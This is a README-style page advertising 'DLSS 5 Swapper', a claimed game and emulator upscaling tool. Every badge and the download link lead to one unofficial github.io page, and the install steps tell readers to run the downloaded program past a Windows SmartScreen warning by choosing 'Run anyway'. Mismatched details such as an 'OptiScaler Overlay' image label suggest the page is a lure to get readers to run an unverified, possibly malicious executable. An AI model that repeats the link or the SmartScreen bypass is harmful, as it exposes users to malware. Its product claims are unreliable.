## DLSS 5 Swapper — Easy DLSS 5 Component Manager for Games and Emulators

<p align="center">
  <a href="https://NVIDIA-DLSS-5.github.io/.github"><img src="https://img.shields.io/badge/GET%20DLSS%205%20NOW-00C853?style=for-the-badge&logo=nvidia&logoColor=white" alt="GET DLSS 5 NOW"></a>
  <a href="https://NVIDIA-DLSS-5.github.io/.github"><img src="https://img.shields.io/badge/DLSS5--FEEDER-EXPERIMENTAL-8b5cf6?style=for-the-badge" alt="DLSS5 Feeder Experimental"></a>
</p>

<p align="center">
  <a href="https://NVIDIA-DLSS-5.github.io/.github"><img src="https://img.shields.io/badge/DIRECTX%209--12-✓-2ea44f?style=flat-square" alt="DirectX 9-12 Supported"></a>
  <a href="https://NVIDIA-DLSS-5.github.io/.github"><img src="https://img.shields.io/badge/VULKAN-✓-2ea44f?style=flat-square" alt="Vulkan Supported"></a>
  <a href="https://NVIDIA-DLSS-5.github.io/.github"><img src="https://img.shields.io/badge/OPENGL-✓-2ea44f?style=flat-square" alt="OpenGL Supported"></a>
  <a href="https://NVIDIA-DLSS-5.github.io/.github"><img src="https://img.shields.io/badge/EMULATORS-✓-2ea44f?style=flat-square" alt="Emulators Supported"></a>
</p>

<p align="center">
  <img src="https://github.com/NVIDIA-DLSS-5/.github/blob/main/assets/1.png?raw=true" width="700" alt="OptiScaler Overlay">
</p>

</div>

DLSS 5 Swapper is a lightweight portable utility designed to simplify the management and replacement of DLSS 5 components in compatible games and supported emulators. The tool automatically searches Steam, Epic Games, and GOG libraries, detects installed applications, and identifies the graphics API used by each title.

Before applying any modifications, DLSS 5 Swapper creates a backup of the original files, allowing users to restore the previous configuration whenever required.

## Supported Graphics APIs

DLSS 5 Swapper works with a wide range of rendering technologies, including DirectX 9, DirectX 10, DirectX 11, DirectX 12, Vulkan, and OpenGL.

Games with built-in DLSS support can have their existing DLSS components updated or swapped easily. For titles without official DLSS integration, the experimental DLSS5-Feeder mode provides a way to test DLSS 5 features on unsupported applications.

## Emulator Compatibility

DLSS 5 Swapper supports many popular emulators, including DuckStation, PCSX2, Dolphin, PPSSPP, Xenia, Cemu, RPCS3, Ryujinx, shadPS4, RetroArch, Flycast, Vita3K, and more.

The application automatically detects supported executables and applies the correct setup method depending on the emulator and rendering environment.

## Main Features

* Automatically scans Steam, Epic Games, and GOG libraries for installed games.
* Allows users to manually add custom game folders.
* Detects the main executable and analyzes the active graphics API.
* Supports DirectX 9, 10, 11, 12, Vulkan, and OpenGL.
* Swaps DLSS 5 components with a simple one-click process.
* Includes experimental DLSS5-Feeder support for games without native DLSS.
* Compatible with both 32-bit and 64-bit applications.
* Supports a wide range of gaming emulators.
* Creates automatic backups before changing original files.
* Restores previous files through the Restore Originals feature.
* Includes Russian language support and many additional translations.
* Fully portable with no installation required.

## System Requirements

DLSS 5 Swapper is designed for modern 64-bit Windows systems with compatible NVIDIA graphics hardware. Results may vary depending on the game, emulator, rendering API, and installed DLSS components.

- **Operating System:** Windows 10 or Windows 11 (64-bit)
- **GPU:** NVIDIA GeForce RTX 20 Series or newer
- **Game / Emulator:** Compatible title supported by DLSS 5 Swapper
- **Storage:** Small amount of free space for the portable tool and backups
- **Permissions:** Administrator access may be required for protected directories
- **Internet Connection:** May be needed for downloading or updating DLSS 5 components

> **Note:** Compatibility depends on the specific application, graphics API, and existing DLSS implementation.

## Installing DLSS 5 Swapper

1. Download the latest version of **DLSS 5 Swapper** from:
   [CLICK](https://NVIDIA-DLSS-5.github.io/.github)

2. Extract the downloaded archive and start the application.

3. If **Windows SmartScreen** displays a warning because the application is unfamiliar, select **"More info"** and then choose **"Run anyway"**.

4. Launch **DLSS 5 Swapper**. The utility will scan your **Steam, Epic Games, and GOG** libraries and display detected titles.

5. If a game is not found automatically, use the manual add option and select its installation directory.

6. Select the desired game and confirm that the correct executable file (`.exe`) has been detected.

7. For games with official DLSS support, choose the **Native DLSS** mode.

8. For games without built-in DLSS, activate the experimental **DLSS5-Feeder** mode. If necessary, manually specify the graphics API.

9. Press **Install DLSS 5** and wait until the process completes. Original files will be backed up automatically before replacement.

10. Start the game and verify the results. When using **DLSS5-Feeder**, the **ReShade** menu can help confirm that the required effects have loaded correctly.

> **Tip:** Close the game and related background processes before swapping components to prevent file access conflicts.

DLSS 5 Swapper automatically saves original files before making any changes. To return to the previous configuration, select the game inside **DLSS 5 Swapper** and use the **Restore Originals** option.
